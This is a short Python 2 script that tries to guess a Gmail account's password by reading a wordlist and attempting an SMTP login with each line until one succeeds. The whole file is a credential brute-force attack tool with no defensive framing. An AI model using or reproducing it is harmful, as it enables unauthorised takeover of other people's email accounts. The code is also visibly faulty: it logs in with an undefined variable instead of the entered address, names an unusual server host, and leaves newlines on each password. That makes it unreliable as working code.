import smtplib
smtpserver=smtplib.SMTP("smtp.google.com",587)
smtpserver.ehlo()
smtpserver.starttls()

user=raw_input("Enter gmail: ")
passwfile=raw_input("Enter wordlists")                          
passwfile=open(passwfile,"r")
for password in passwfile:                                              
    try:
       smtpserver.login(mail_user, password)
       print "[*] password found: %s" % password
       break;
    except smtplib.SMTPAuthenticationError:
       print "NOT FOUND: %s" % password
